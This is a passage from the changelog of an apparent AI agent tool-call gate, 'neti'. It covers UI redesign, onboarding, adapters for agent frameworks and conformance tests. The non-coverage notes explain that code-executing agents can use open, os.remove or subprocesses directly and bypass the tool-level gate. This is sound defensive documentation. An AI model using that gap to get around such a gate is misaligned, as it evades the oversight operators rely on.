from scale and space instead — big type, a wide scene, a spotlight rather than a frame, and a rule
under the band separating it from your own numbers. It reads as featured without becoming the one
card on a page that has none.

Your three totals and the verdict split sit immediately beneath it, which keeps the trade honest: a
page that led with a pitch and buried the data would be the wrong order, and a rotation — rather
than a wall of feature cards — is what lets this sit on top without taking the page over.

### The overview is an analytics home now

Asked for three times, delivered on the third. `VerdictSplit` sits under the three totals: one
proportional bar in the reserved verdict colours, the counts, and a sentence saying what the shape
means — 11 allowed, 2 needs approval, 4 blocked, and *a session nearly all green is a policy costing
nobody anything; one nearly all red is a ceiling set below how the agent actually works.*

That is the question anybody asks of a policy they just wrote, and answering it used to mean reading
three separate totals and doing arithmetic. A bar rather than a donut: a donut asks you to compare
arc lengths and collapses into a single coloured circle when a session is all one verdict, where a
bar degrades into one honest full-width segment.

Order above the fold is now: your three numbers, what the gate did with them, what a second machine
would add, then the reach table and distributions. Your own data first, the pitch after it.

The pill rule from the previous change caught the new bar on the day it was written — a 2px
proportional bar has round ends because it is a bar, like the status dots. The exemption is stated
in the test rather than assumed, which is the rule working rather than failing.

### Undoing a regression I shipped without looking at a single page

Five screenshots, and they were right. Most of what was wrong was mine, and it got in because I ran
a blanket regex over `web/src` and rebuilt without opening the console.

"Everything you press is a pill" is a good rule. The implementation was
`re.sub(r"rounded-(md|lg|xl|2xl)", "rounded-full", line)` on every line with a radius class, which
cannot tell a control from a container. So it pilled things nobody presses:

- `/gate` — the empty-state container became a **1,500px stadium** wrapped around the whole page,
  and the "Fire your own" panel became a second one, clipped off-screen.
- `/approvals` — a three-line `<pre>` code block became a pill.
- `/decisions` — **every row** became a stadium, so a decision log read like a chat thread. Fourteen
  bubbles where seventeen scannable rows belong.

**The test passed the entire time**, because it asserted that pressable things *are* pills and never
the inverse. That assertion exists now: a line carrying `rounded-full` must also carry a control
signal — a button, a click handler, an accent fill, a chip's padding — or it is a container wearing
a control's shape. It immediately caught a `<code>` on `/policy` styled as a button that did nothing
when pressed, which is the same lie in the other direction.

Radii are assigned by what a thing *is* now: controls and chips are pills; rows carry no radius and
are separated by rules; code blocks and inputs get `rounded-lg`; section wrappers get none.

**Dead space.** `/approvals` rendered a short block and then eight hundred pixels of nothing. It is
an `EmptyState` at `page` density now, with a live scene and one action — and `page` density fills
68vh rather than 46, because an empty state that sits in the top half of the screen is the dead
space it was supposed to solve.

**`/audit`** showed three facts of equal weight three different ways: "Chain intact" in a box beside
two stats that were not. One row now, colour on the word rather than a border around it.

### No badge, everything pressable is a pill, and the overview says what a second machine adds

**The chip is gone.** A pill pinned over every screen reading "Local · this machine" announced a
non-fact: which version you installed is not a state the product needs to keep telling you about,
and it was chrome spent saying so. It had already been wrong once — as "Demo tenant" — and the
honest end of that thread is not a better label but no label.

**Everything pressable is a pill.** The earlier sweep only caught accent buttons and toggle rails;
chips, tabs, segment controls and icon buttons were still rectangles, which defeats the point —
reserving one shape for *press me* only works while it is reserved. Thirteen files. The exceptions
are deliberate and narrow: text inputs, and the icon plate on an empty state.

**`CloudSlides`, at the foot of the overview.** A slow rotation of what the hosted tier adds, under
your own numbers rather than in front of them, linking to neti.security. Four slides, and every one
of them names something a single machine genuinely cannot do — a confirm that reaches a human, one
policy across a fleet, many machines' decisions in one place, a reviewed catalogue. It says
"everything on this page stays free", because that is true and because the rest of this repository
would make a different claim embarrassing.

A rotation rather than a grid of feature cards: DESIGN.md forbids the card grid, and a grid asks you
to read four pitches at once where a rotation asks for one. Motion runs on the live-scene kernel, so
it is gated on reduced motion, tab visibility and viewport like every other moving thing here.

### The pre-flight pass, actually done

`DESIGN.md` ends with a checklist and I had twice reported the console as finished without running
it. Running it found the rest of the cards: twenty-one `panel rounded-2xl` wrappers across seven
pages, flat since liquid glass was removed but still boxes — a plate around a decision's detail, a
plate around the policy table, a plate around each scorecard incident. They are sections now: a rule
above, space below, and the content unwrapped.

Looking at the pages also caught copy the rename had missed. The scorecard said *"A demo session,
not a measurement of your traffic"* and the incident corpus attributed one entry to *"the demo"*.
Neither is a demo — one is a scripted session and the other a shipped scenario, and both now say so.
That is the third place "demo" was hiding after the badge and the record flag, which is a fair
argument for having grepped harder the first time.

`/policy`, `/decisions`, `/approvals` and `/scorecard` have now been opened and looked at rather
than merely built.

### A walkthrough, and pills

**`docs/TUTORIAL.md`** — the product in the order it actually happens, because "install it and read
nineteen commands" is not an onboarding. Day one you measure, day two you decide, day three you
enforce, and that ordering is the whole argument: a policy asks for a ceiling, and on day one nobody
knows whether 300 is generous or absurd for their repository. So the number comes first, from your
own traffic, and you are never asked to guess one.

It also states the two tiers plainly, in one table, because "why would I pay" deserves a straight
answer. The local install is not a demo, a trial or a reduced mode — resolving, blocking, the sealed
chain, every adapter and the console are all free and stay free. The rule dividing the tiers is *can
one machine do this?*, which is why enforcement is free and why what the hosted tier sells is a
server that is running rather than a secret about how to decide. A `confirm` means somebody other
than the operator should answer; on one machine there is nobody to ask, so the gate stops the call —
correct behaviour that a free install keeps doing forever.

**Anything you press is a pill.** Buttons, toggle rails and their segments are `rounded-full` now.
It is the one shape in the system that says *press me*, and reserving it makes the distinction
carry — a pill is interactive, a rectangle is not. That only holds while it is actually reserved, so
a test fails the build on a pressable-looking `rounded-lg`. Inputs and text areas keep a normal
radius on purpose: a pill-shaped multi-line field reads as a chat box, which is a promise about what
happens when you type in it.

### The primary is Fireblocks' #4568F3, and it was read rather than guessed

neti belongs to the Fireblocks system, so it wears that system's accent.

**I had the colour wrong before I looked.** Asked for it, I assumed Fireblocks was orange and
measured the objection first: an orange accent would collide with the reserved verdict scale, badly
— `#F5A623` sits ΔE 2.4 from `confirm`, which is indistinguishable, and `#FF5100` fails against
`block` at 13.8. That would have broken the product's whole vocabulary, where amber means "hit your
ceiling" and nothing else.

Fireblocks is not orange. Read off their own site's computed styles rather than eyeballed from a
screenshot: accent `#4568F3`, navy `#212647`, secondary text `#415080`, dark surface `#27455C`,
muted `#C2C8D8`, light surfaces `#F4F5F7` / `#ECEFF4`. The accent is an indigo, and it clears the
floor comfortably — ΔE 43.8 against block, 50.6 against allow, 62.8 against confirm.

So there was no trade-off to make, and the objection cost nothing to raise. Measuring before
adopting is the point: had it been the orange, the collision would have shipped and shown up later
as a scale nobody could read.

The neutrals are unchanged for now — Fireblocks' navy `#212647` is a different dark family from the
`#0F0F10` the console and site share, and swapping the whole surface system is a bigger change than
an accent swap and wants looking at rather than asserting.

### Liquid glass was Claritty's rule, not neti's, and it hid inside a class name

`glass-card` — backdrop blur, saturation, a translucent fill and an inset ring, with an `-elevated`
variant carrying two drop shadows — sat in `globals.css` applying all of that to twenty-one
elements. Liquid glass is the *Claritty platform's* default surface. neti's `DESIGN.md` says the
opposite: no shadows, do not default to cards. The class was the seam the wrong rule leaked through.

It is `.panel` now, and it is flat: a hairline border and a surface fill, for the places where
something genuinely needs separating from the page. Renamed rather than redefined, because a class
called `glass-card` that is not glass is the next person's confusion.

**It survived because the test only looked where somebody remembered to look.**
`test_nothing_casts_a_shadow` greps components for `shadow-*` utilities and had never read the
stylesheet, so every component-level check passed while the CSS applied blur and two box-shadows.
`globals.css` is now asserted directly to declare no `backdrop-blur`, `backdrop-saturate` or
`box-shadow` — with comments stripped first, since the prose explaining why glass was removed
naturally contains the words.

### It was never a demo, and calling it one was also a data bug

The console branded every install without Entra credentials **"Demo tenant"**. That was wrong in two
directions at once.

A local install is not a demo. It resolves real magnitudes off a real machine, enforces real
verdicts and seals a real chain you can re-verify. There is no reduced mode and no watermark on the
numbers — if nothing else is ever installed, the gate is doing its whole job. What one machine
cannot do is ask somebody else, and that is what the hosted tier adds: a difference in reach, not in
whether this one works.

**And the flag driving that label was also stamping records.** `Engine(synthetic=demo)` marked
records synthetic whenever no Entra credential was present — including on a coding-agent policy
where every magnitude was measured from real files on disk. Marking a real measurement as invented
is the same class of lie the flag exists to prevent, pointing the other way.

The predicate is `demo and policy.binds_entra()` now. A policy that never asks a directory anything
has no fixture in it, so:

    filesystem policy, no credentials    Local · this machine       records: measured
    Entra policy, no credentials         Sample directory · …       records: synthetic
    Entra policy, real credentials       Local · <tenant>           records: measured

`tests/integration/test_api.py` asserts both directions, because renaming the demo away must not
quietly turn fixture group sizes into findings about a real directory.

The overview lost its last three plates as well: the reach table, the distribution plots and the
uncapped-parameter notice are sections and rules now rather than boxes.

### The four live scenes are actually wired now, and the last dashed box is gone

The previous pass built the scenes and wired one. `ReachScene` was an unused import, `GateScene` and
`ConnectScene` were written and connected to nothing, and `/gate` — the page in the screenshot that
started this — still had its dashed rectangle. All four are in place:

    /         ReachScene     when there is no policy and no traffic at all
    /gate     GateScene      a 1,680-object call stopped at the ceiling
    /audit    ChainScene     records sealing to one another
    /connect  ConnectScene   the demo-tenant section, which is the not-connected state

The connect page's dashed box turned out not to be an empty state at all — it was an informational
panel with a table inside it, which is a card. It is a section with a rule now. The last dashed box,
in `approvals`, went the same way, and `test_design_rules_hold.py` now fails the build on
`border-dashed` anywhere in `web/src` so it cannot come back.

**The one-accent-action rule caught a second violation, and it was worse than duplication.** `/gate`
rendered `Connect` in its header *and* `Connect a provider` in the empty state — but the header
button ran an in-page `connect()` while the empty state's linked to `/connect`. Two different
actions wearing the same word, three inches apart. The empty state owns the real action now and the
header has no button, because once connected there is nothing left to connect.

### There was no way in

The feedback was *"I don't understand how to use it, or why I'd pay"*, and running the thing as a
stranger showed it was fair on every count.

Bare `neti` answered `Missing command.` — no orientation. `neti --help` printed **nineteen commands
in one flat list**, with `measure` — an internal Graph-latency benchmark — second. The four commands
that are actually somebody's path were numbers 1, 11, 13 and 19, in no order and with nothing saying
which came first. The one command that shows the point in ten seconds, `neti demo --here`, was last,
described as "Run the whole narrative and emit it".

And underneath all of that, **the product asked for a number nobody has**. A policy says
`above: 300, verdict: block`. On day one you cannot know whether 300 is generous or absurd for your
repository, so the first real step demanded the one thing a new user cannot supply. The loop that
solves it — observe, then `neti propose` from your own traffic — existed and worked, and nothing
told you it was there. You had to already understand the product to find the on-ramp.

**`neti start`** is the way in. It finds your agent, writes a policy that blocks nothing, measures
*this* machine, and ends by saying what to do today and what to do tomorrow. The first thing it
prints is a fact about your own repository:

    The largest set one gated call could touch, right now, here:
       23,583 objects
    That is capability, not an incident.

The five evaluation commands (`measure`, `check`, `score`, `prove`, `serve`) are hidden rather than
removed — they still run, so every doc, justfile recipe and golden transcript that names them still
works, but they are not on anybody's first screen. What is left is grouped into `Start here`,
`Every day` and `When you need it`, in the order somebody needs them.

`tests/e2e/test_first_run_orients.py` holds it: the first screen carries no evaluation command,
`Start here` is the first panel, the first run measures something, writes a policy in observe mode,
names the next three commands, and is safe to run twice without overwriting a policy you have since
edited. "I don't understand how to use it" is a bug, and bugs get tests.

Writing it caught one immediately: `_write_example` printed its own "Next:" block in the middle of
step 2, so a newcomer got two competing sets of instructions three lines apart — the exact confusion
the command exists to remove.

### DESIGN.md, one primary, and no cards

The console was skinned from Claritty once and then drifted, because there was nothing written down
to drift against. Three symptoms, one cause:

The **palette had split in two**. `site/page.html` used Claritty's brand accent `#5B7FFF` directly
while the console re-skinned itself to violet `#8B5CF6`, so neti had two identities and one of them
belonged to another product. The primary is now **`#3B82F6`** — Claritty's own `--info`, so a real
Claritty colour, deliberately not its brand accent, which keeps meaning Claritty.

**The palette validator did not exist.** `globals.css` opened with *"The accent was CHOSEN BY
RUNNING THE PALETTE VALIDATOR, not by taste"* and cited cyan failing at ΔE 12.5 against the reserved
emerald. Nothing in the repository could re-run that, and the number does not reproduce — cyan
measures 28.8 under CIEDE2000. A comment asserting a measurement nobody can check is the failure
this project keeps finding in itself, so the measurement moved into
`tests/property/test_design_rules_hold.py`, which recomputes every pair on every run. `#3B82F6`
clears the floor of 15 with a minimum of 45.4, and sits 6.4° of hue from Claritty's brand — close on
purpose.

**Everything was a card.** Forty-five bordered, rounded, blurred wrappers, including a `Card`
primitive with glassmorphism and drop shadows that **nothing imported** — dead code shipping three
rule violations. The overview was three bordered plates stacked on a bordered table: four boxes to
say three numbers. Structure comes from hairline rules and spacing now, and the test fails on a card
import, a hardcoded hex, a `shadow-*` or a `hover:scale`.

**Empty states are one primitive.** `Empty` in `Page.tsx`, a hand-rolled dashed rectangle in
`gate/page.tsx`, and nothing at all on seven other pages, replaced by `EmptyState` with three
densities — the same collapse clarity-platform recorded making. Four pages get a **live scene**
(`ReachScene`, `GateScene`, `ChainScene`, `ConnectScene`) built on a ported kernel whose rules are
strict: motion gated on reduced-motion, visibility and viewport; a composed final frame rather than
a blank box when it is off; timers only, no rAF, no canvas, no network assets.

All of it is written down in **`DESIGN.md`**, with an anti-patterns table naming the four real
mistakes above, so the next person has something to cite.

Following that file's own pre-flight list immediately caught a fifth: the audit page rendered two
accent buttons at once — "Verify chain" in the header and the empty state's CTA — against its own
one-accent-action rule. The header now hides its button while the chain is empty, which is also more
honest: there is nothing to verify before anything is recorded.

### The console told every coding agent it could reach nothing

`neti console` built its resolvers with `resolvers_for_client(client)` and never passed the policy's
`providers:` block. Every other caller passes it — `preflight.py`, `cli.py`, `eval/here.py` — and
without it `fs.paths` has no declared root, so it has no bound to report and declines.

The consequence was not subtle. The console's headline number is *reachable in one call*, and on a
filesystem policy it read **0**, with the whole "what each tool can reach" table showing `—`. That
is the most common policy there is, on the one surface built specifically for showing people
numbers. Pointed at a 1,680-file tree it now reads 1,680.

Found by running the UI to look at it, which is the only way this class of defect surfaces: every
API test passed, because they assert the shape of the response rather than whether a resolver was
given the configuration that lets it answer. The regression test goes through `build_state` and
checks a resolver comes out *bounded*, not that an argument was passed.

### The last piece of scaffolding, removed — and a scope limit that was overdue

`just conformance-live` runs a real model, a real agent and a real oversized call, and checks the
gate stops it. Three runtimes rather than eleven: what it adds over the scripted rows is that a
model *actually walks into* the gate, and proving that three times with a paid model says as much
as proving it eleven times and costs less. **You run it** — the key belongs to whoever spends it,
the same rule as M7 and M12.

It records what the model said next and does not assert on it. Classifying that is M7's question,
M7 has a harness, and its classifier is pinned by `tests/e2e/test_m7_classifier.py`.

M13 on the card now distinguishes the two halves, because eleven rows reading `driven` is the
easiest thing on that card to mistake for a finished result. Without a live run it says so out
loud: *nobody has run it against a real model here*. A live row that skipped for want of a key is
never counted as proved.

**NC-14, and it should have been written down when the smolagents adapter was.** A code-executing
agent — `CodeAgent`, and anything shaped like it — does not emit tool calls. It writes Python and
runs it, and calling a tool is one of the things that Python may do. The adapter gates every call
that goes through a tool. It does not gate `open(...)`, `os.remove(...)`, a subprocess, or an
import that reaches the network, because none of those cross a tool boundary and no gate at a tool
boundary can see them. The thing that bounds them is the executor's own sandbox. A reader who
assumes otherwise has assumed something dangerous, so it is in the non-coverage table rather than
in a docstring.

### Eleven runtimes, all through their own agent loops — and the smolagents adapter did not work

The three new adapters had seam-table rows, which prove the adapter honours the framework's
contract when you call it directly. Building a real agent out of each one found that for smolagents
that was not the same thing:

    AssertionError: All elements must be instance of BaseTool (or a subclass)

`gate_tool` returned a plain object that copied the four attributes and delegated the rest. It
passed every direct test and `ToolCallingAgent` would not accept it, so the adapter could not be
used to build an agent at all — which is the only thing anybody would want it for. It is a real
`Tool` subclass now, with `skip_forward_signature_validation`, the flag smolagents sets on its own
wrapper tools (`from_langchain`, `from_gradio`) for exactly this reason.

That is the second adapter this directory has caught and the same shape both times: correct against
its own tests, wrong when the framework runs it.

All three now drive a full agent loop with no model:

    llamaindex        a FunctionAgent over a FunctionCallingLLM
    smolagents        a ToolCallingAgent over a scripted Model
    semantic-kernel   the auto function-calling loop over a scripted chat service

Semantic Kernel needed `SUPPORTS_FUNCTION_CALLING` declared on the client: without it the kernel
skips automatic invocation, the function is never reached, and the row would have passed on *the
tool never ran* while proving nothing at all. That is why every row asserts the sentence the agent
was shown as well — an untouched tool is not evidence when the loop never got there.

### Three more runtimes, and the seam each one actually offers

LlamaIndex, smolagents and Semantic Kernel have adapters now, so they move from *reached because
they speak MCP* to *driven by an adapter* — on the card, in the README and in the seam table, which
compares fifteen doors and finds them byte-identical.

Each one's seam was chosen by reading the framework rather than by pattern-matching the last
adapter:

- **LlamaIndex** carries `call` and `acall`, and `FunctionAgent` and `AgentWorkflow` both take the
  async one. Gating only the sync path would have left every real agent open while looking covered.
  Both are gated; a denial is a `ToolOutput` with `is_error=True`, without which the model reads a
  refusal as a successful call that happened to return that text.
- **Semantic Kernel** ships a filter pipeline, so nothing is wrapped at all — the gate is a
  registration. A filter blocks by *not* awaiting `next`, and the sentence goes in `context.result`.
  Deliberately `FUNCTION_INVOCATION` rather than `AUTO_FUNCTION_INVOCATION`: the second sees only
  functions the model chose automatically, and a plugin invoked by another plugin would walk past
  it. Cardinality is a property of the call, not of who proposed it.
- **smolagents** wraps the tool object, and comes with a limit written down rather than discovered:
  `CodeAgent` does not emit tool calls, it writes Python and runs it. Wrapping the tool gates every
  call that goes *through* the tool and gates nothing the generated code does directly — `open`,
  `os.remove`, a subprocess. No gate at a tool boundary can see those, and the thing that bounds
  them is the executor's sandbox.

Two defects on the way. `neti prove` died with a bare `KeyError: 'llamaindex'` under a traceback,
because a seam can be registered in `NEEDS` and `WHAT` and forgotten in `DRIVERS`; the three tables
are asserted equal now. And `prove`'s CrewAI driver was still running the disproved hook pair, so it
was demonstrating a control flow CrewAI does not have.

`sdks-more` is a third extra rather than growth in the other two, and its cost is measured the same
way: installing all three took the environment from 206 packages to 262.

### A real MCP client had never driven the gate

`tests/e2e/test_real_mcp_server.py` puts neti in front of a real MCP server. The client in it is
always ours. The other direction — a third-party client connecting *to* `neti gate` — is the widest
claim this project makes and had never been run at all: README names Cursor, Claude Desktop,
Windsurf, Cline, Continue, VS Code, Zed and Goose as covered, on the reasoning that they speak MCP
and the gate goes in front of the server. The reasoning is sound. It rested on nothing.

`tests/e2e/test_real_mcp_client.py` connects the official SDK's `ClientSession` to `neti gate
--stdio` over a real pipe, with a real handshake, against a child server that answers everything —
so a gate that forwarded a call it should have stopped is caught by the child *replying* rather
than by an assertion somebody remembered to write. One oversized call is refused with the magnitude
in the sentence; one that fits reaches the server untouched, which is the half that decides whether
anybody leaves the gate installed.

What it verifies is the SDK those clients are built on, at the version they ship — OpenClaw bundles
`@modelcontextprotocol/sdk` 1.29.0, and OpenAI's Codex CLI speaks the same protocol. It is not a
test of any product's user interface, and the file says so, because `neti score` already keeps
*driven* and *reached* apart and this must not blur them.

### M13, and a compatibility table generated from the run that produced it

`neti score` carries runtime conformance now, and README.md's table is written by `just matrix`
from `eval/results/conformance.json` rather than typed. A hand-maintained compatibility matrix is
the most quoted thing in a README and the least diffed: it goes on saying "works with CrewAI" long
after the version that was true of, and the part a reader actually wants — which version, and what
exactly ran — is the part that rots first. `tests/property/test_media_is_current.py` fails the build
when the table and the recorded run disagree, and a second test fails when a recorded version is
not the version installed here, so an upgrade cannot leave the claim standing.

Absent is *not run here*, never *failed*, the same as M7, M10, M11 and M12 — it matters more on this
section than any other, because it is the one a reader consults to find out whether their framework
works, and a blank row must not read like a bad one. A framework that is not installed renders as
`absent`, never as driven.

Two README paragraphs were wrong as of the CrewAI fix and are corrected: the gate is a wrapped tool
there now, not a pair of hooks, so it is three of the seven runtimes that need nothing wrapped
rather than four.

The rows were checked against a negative control by hand: built without any neti wiring, every one
of the eight frameworks executes the tool. So `the tool body never ran` is a real signal on all of
them and not an artifact of the harness. (A first attempt at that control passed a malformed
`Preflight` stub and made two frameworks fail before execution, which looked briefly like a hole in
those rows and was a hole in the stub.)

### CrewAI told the model "blocked by hook" and never told it the number

Found by running `Crew.kickoff()` instead of imitating it.

`crewai_hooks` gated through CrewAI's hook pair: `before_tool_call` decides and stashes the
sentence, `after_tool_call` puts it back in place of the fixed string CrewAI substitutes. The
module docstring explained the arrangement carefully. It could not work, and never had.
`crewai/utilities/tool_utils.py` has exactly one call site for the pair, and it returns the moment
a before-hook answers `False`:

    for hook in before_hooks:
        if hook(hook_context) is False:
            return ToolResult(blocked_message, False)   # after-hooks never reached

So on every CrewAI executor path, a blocked call reached the agent as:

    Observation: Tool execution blocked by hook. Tool: Glob

No magnitude, no ceiling, nothing to narrow. On CrewAI the product was a refusal rather than a
number, which is most of the value gone — the sentence is what makes an agent retry with a smaller
target instead of giving up or repeating itself.

**It survived because the test imitated the framework rather than running it.** `via_crewai` in the
seam table called the before-hooks, substituted CrewAI's fixed string *itself*, then ran the
after-hooks over that string and watched them replace it — a control flow real CrewAI does not
have. The reproduction was wrong in precisely the way that made the assertion pass, and the seam
table's byte-for-byte sentence claim was therefore false for CrewAI the whole time.

The gate moved to where every other adapter in this package already puts it: the tool.
`crewai_hooks.gate_tools` wraps a `BaseTool` and returns the sentence from `_run`, which CrewAI
hands the model as an ordinary tool result. `install` is kept for recording without touching tool
objects, and now says plainly that the model will not be told the number. A test asserts CrewAI's
real behaviour — fixed string, no magnitude — so if a future version runs after-hooks on a blocked
call, it fails and the design gets reconsidered on purpose.

### Every popular runtime's own agent loop, driven with no model at all

`tests/conformance/` and `just conformance`. The seam table proves each adapter honours its
framework's contract by calling the integration point directly. That is the right way to compare
twelve seams, and it leaves the question a user actually has unanswered: *when the framework runs
the tool its own way, is the gate in the path?* This repository had already shipped one defect of
that shape — a blocked call raising `TypeError` inside LangGraph's `ToolNode` — and has now shipped
a second.

Eight runtimes, each built from its own public API and run to the point of tool execution:

    langgraph       a compiled StateGraph executing a ToolNode
    langchain       langchain.agents.create_agent, via the model interface
    openai-agents   Runner.run over a Model implementation
    pydantic-ai     an Agent over FunctionModel
    google-adk      an App run by InMemoryRunner
    autogen         AssistantAgent.run over a wrapped workbench
    anthropic       tool_runner, with the sentence read off the wire
    crewai          a real Crew.kickoff, read from the agent's observation

**None of them has a model.** Every row scripts the response — an `AIMessage` written by hand, a
`FunctionModel`, a `BaseChatModel` subclass, a mock HTTP transport. That is the point rather than a
convenience: it is what demonstrates the gate sits at the execution seam, where the model chooses
*what* to call and the gate decides *whether it runs*. No key, no network, no provider, no cost,
the same answer every time — so this runs in CI on every push instead of being a demonstration
somebody gave once.

Each row asserts the tool body never executed, that the sentence the agent was shown is byte-for-
byte what `Preflight` produced, and that the decision was sealed. Versions are recorded in
`eval/results/conformance.json`, because "tested with LangChain" is a sentence that outlives the
version it was true of.

`langchain` joins the `sdks` extra: 1.x moved `AgentExecutor` out of the package and deprecated
LangGraph's `create_react_agent` in favour of `langchain.agents.create_agent`, and pinning a
conformance claim to a legacy constructor would make the row quietly untrue on a current install.

## 0.2.0 — 2026-08-05

### The model was never told which questions it was being asked

`neti suggest` sent a model a JSON payload of tools and parameters and relied on a line in the
system prompt — *answer for every parameter you are shown, exactly once* — to keep the answer
aligned to the question. Nothing made that checkable, and a small model asked about `move_file`
answered for `move_file/path`: a parameter the tool does not have. `parse` dropped it as unknown,
and `source` and `destination` went unanswered. One invented name cost three results.

The request now ends with the exact list of `tool/parameter` keys expected back, built from the
same batch as the payload so the two cannot disagree. It sends nothing new — every name in the list
is already in the JSON above it, and a property test asserts exactly that, so the clarification
cannot quietly become a second channel for things the operator never agreed to send.

Measured on the same model, same corpus, same batch size, changing only the request shape:

    recovery    30 of 34  ->  33 of 34      still 0 wrong resolvers
    over-claim  28 of 41  ->  19 of 41      the "a search string is SQL" appetite

The over-claim drop is the more interesting half, and it was not aimed at: nothing in the change
mentions a tool, a resolver or an answer. A model that knows precisely what it is being asked stops
free-associating about everything else. Stated plainly for the record: the misses were read before
the change was made, so these are not blind numbers — but the change is content-neutral, and the
arm B corpus was never touched.

### M12 arm C — the 401, adjudicated

Arms A and B measure a model where somebody already decided: A against gates the rule table makes,
B against parameters it declined in writing. Neither answers the question `neti suggest` exists for
— **of the 401 parameters no rule touches at all, which ones actually name a set?**

That needs an answer key, and an answer key here is an opinion. `eval/answers/adjudicate.py` is
that opinion, written as rules rather than four hundred typed judgements so it can be argued with:
each rule states the class it covers and why, and `claimable.json` is generated from it and
committed, so a re-run's diff is the review. Thirteen pairs are labelled `unadjudicated` and scored
nowhere — a shell command and a subagent prompt can touch anything, and calling that "not a set"
would understate it badly.

The first number, from a local 8B model with no key and nothing leaving the machine:

    of 388 adjudicated parameters, it claimed a resolver for 92 that are not sets,
    and forced 7 real sets into a resolver that cannot size one.
    It found 7 gates the rule table misses. It found all 7 that exist.

Both halves matter. The seven are real: `filename` on seven browser tools is documented as a path
on this machine to save a screenshot or a snapshot to, `fs.paths` ships and would answer it, and
the rule table's name rule simply does not know the word `filename`. That is a gap found by asking.

And the cost of finding it was ninety-nine wrong claims, from two systematic errors — `fs.paths`
onto anything id-shaped (`Read/offset`, `Edit/replace_all`, `Grep/head_limit`), and `github.repos`
onto `repo` on all twenty-one GitHub tools, where that resolver counts the repositories *under an
owner* and `repo` is one repository. It never once used `no_shipped_resolver`, the answer that
exists so it does not have to guess.

Six percent of its claims were right. That is the argument for the shape this command already has
— a commented-out fragment, empty bands, in a file the gate never loads — and against ever letting
it near a decision. The number is on `neti score`, wrong count first.

### The out-of-the-box journey is a command now, not a story

The last four defects in this file share a cause: they were invisible from a source checkout, where
the repository root is two directories up and every example, fixture and document is simply *there*.
Nearly two thousand tests all ran in that layout. None of them ran in a customer's.

`just e2e` closes it. It builds a virtualenv, installs the published wheel from PyPI, generates a
tree with a *known* file count and walks the whole documented flow — measure, gate, block, seal,
tamper, verify, prove, serve — asserting twenty-two numbers rather than printing them. `just e2e
--local` runs the same journey against the working tree. The tree is generated rather than borrowed
because pointing it at a real repository makes the expected values machine-dependent, and a check
whose number changes when somebody runs `npm install` is one people learn to ignore.

Writing it caught one thing immediately, and not in the product: the first draft looked for `CHAIN
BROKEN` on stdout, where `neti verify` does not print it. It reports the break on stderr and exits
1. A check pinned to the wrong stream is a check that passes forever, so the tamper step now asserts
both the message and the non-zero exit — the exit code being the part that actually matters, since
cron and CI read the status and nothing else.

The README and the landing page said to install from git "because the package is not on PyPI yet".
It is, so they say `pip install "neti[all]"` now.

## 0.1.0 — 2026-08-04, first release on PyPI

Everything below shipped in the published `0.1.0` wheel. It sat under an `Unreleased` heading
while it was being written and the heading was never moved when the package went out, which made
the file claim that work nobody could install was still pending and that work everybody could
install did not exist. Corrected here rather than quietly.

The `v0.1.0` git tag is older than this and does not point at the commit the wheel was built from.
It is left where it is — a tag that moved once is a tag nobody can trust again — and `0.2.0` is
the first release whose tag matches its artifact.

### The first command in the README did not work on a real install

`neti demo --here` is the first thing this project asks a stranger to run. On a clean install it
answered:

    error: cannot find examples/coding-agent.yaml. Pass -c with your own policy.

`examples/` was never in the wheel, and every path `_packaged_example` tried assumed a source
checkout — `parents[2]` is the repository root from `src/neti/cli.py` and `lib/python3.12/` from
`site-packages/neti/cli.py`. Its own docstring says *"file not found is a worse first impression
than any finding is a good one"*, which is exactly what it delivered.

`neti prove` was worse, and it is the command `demo --here` recommends in its closing line. Bare, it
answered *no policy at examples/entra.yaml*, because the default is that literal string and it was
joined under the package's own examples directory. Pointed at a coding-agent policy it ended in
`AssertionError: the gate let the call through` under a rich traceback: it drives one fixed Entra
call and every seam driver asserts the call was stopped, so a policy that cannot gate that call
cannot answer its question. And `neti init` with no MCP servers — the ordinary case for anyone gating
Claude Code's built-ins — pointed at `cp examples/coding-agent.yaml neti.yaml`, a directory that
exists in a checkout and nowhere else.

The wheel carries the examples now, `neti init --example coding-agent` writes one from the package,
and `tests/property/test_the_wheel_is_usable.py` reads the built artifact rather than the working
tree so it fails for the same reason a customer would. Found by installing the published package
into an empty virtualenv and walking the documented flow, which is the only way this class of defect
surfaces — and why it survived a suite of nearly two thousand tests.

### Every first run answered with a raw errno, and one with a traceback

`neti demo` with no arguments ended in a `FileNotFoundError` traceback. `inventory`, `report`,
`propose`, `verify`, `score` and `install` each answered `error: [Errno 2] No such file or
directory`. All seven are somebody's first run, and the difference between a tool that is missing a
file and a tool that is broken is entirely in that message.

Two shared resolvers stand in front of all of them now. A missing policy names `neti init` and
`neti init --example`. A missing records file explains that the gate writes those as it decides and
names `neti install` and `neti prove` — with the follow-up spelled out, because `prove` writes
`out/proof.ndjson` rather than the default path and `neti report` bare would otherwise have failed
again immediately afterwards. A test now reads the command list off the Typer app and asserts every
`neti <thing>` the guidance names is real: nothing had been comparing the words to the program,
which is how `cp examples/coding-agent.yaml` survived.

### neti was unusable on Windows, and the suite could not see it

The first Windows CI run this repository has ever had found five defects. `neti init` reads the MCP
client configs already on the machine and carries a Windows branch for finding Claude Desktop's
config *precisely because we expect to run there* — and read them with no encoding, so cp1252, so
one accented character in a path and it died with a stack trace about charmap.

Worse, the CLI could not print. Every screen it draws uses characters above ASCII: the `──` rules in
`neti demo`, the `·` separators, the `≥` that says a walk stopped at its cap. Windows stdout encodes
none of them, so `neti demo --here` printed a traceback instead of output, and so did `report`,
`propose`, `verify` and `prove`. **`neti hook` is the sharp end**: its JSON carries the denial
sentence, which has an em-dash in it, so it would raise, exit non-zero, and a `PreToolUse` hook that
exits non-zero *fails the tool call it was asked about* — every gated call in the session dead.

And `msvcrt.locking` is a *mandatory* lock where `fcntl.flock` is advisory. While one writer holds
it another process cannot open the record file to read at all and gets `PermissionError`. Claude
Code issues tool calls in parallel with one hook process each, so two agents starting at once is the
ordinary case there; the second one died out of `Preflight.demo` before the gate had decided
anything. `chain_head` retries now, and giving up is safe because `_sealed_append` re-reads the head
under its own exclusive lock before sealing.

Every one is now an invariant rather than a fix: `test_text_io_declares_its_encoding.py` is
parametrised over every source file and also catches temp files, the encoding fix is tested against
a stream that *behaves* like a Windows console so it does its job on machines where the bug cannot
happen, and the lock retry is simulated rather than skipped. macOS, Linux and Windows are green
across three hash seeds.

### `neti suggest` — your model, or one on your own machine

`neti init` gates what its rule table can claim. Against the 170 real tool schemas in
`tests/corpus/` that is 31 tools; it declines 41 with a written reason and leaves **401 parameters
with no rule at all**. This asks a model about that remainder.

